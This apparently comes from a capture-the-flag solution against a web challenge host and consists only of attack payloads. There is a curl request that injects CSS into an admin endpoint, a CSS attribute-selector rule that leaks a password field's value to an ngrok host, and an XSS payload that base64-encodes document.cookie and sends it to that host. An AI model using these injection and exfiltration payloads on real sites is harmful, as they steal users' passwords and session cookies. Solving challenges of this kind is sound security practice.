curl 'http://chall.csivit.com:30256/admin' --data-raw 'url=http%3A%2F%2Fchall.csivit.com%3A30256%2Fview&color=red%3B%7D+.show+%7B+background-image%3A+url%28http%3A%2F%2F05a5450b7170.ngrok.io%2Fexfil%29%3B' \
  --compressed \
  --insecure

input[type=password][value^=P] ~ * { background-image: url(http://05a5450b7170.ngrok.io/exfil/P);

blue;} <></style><img src=x onerror="fetch('http://05a5450b7170.ngrok.io/' + btoa(document.cookie))"><style>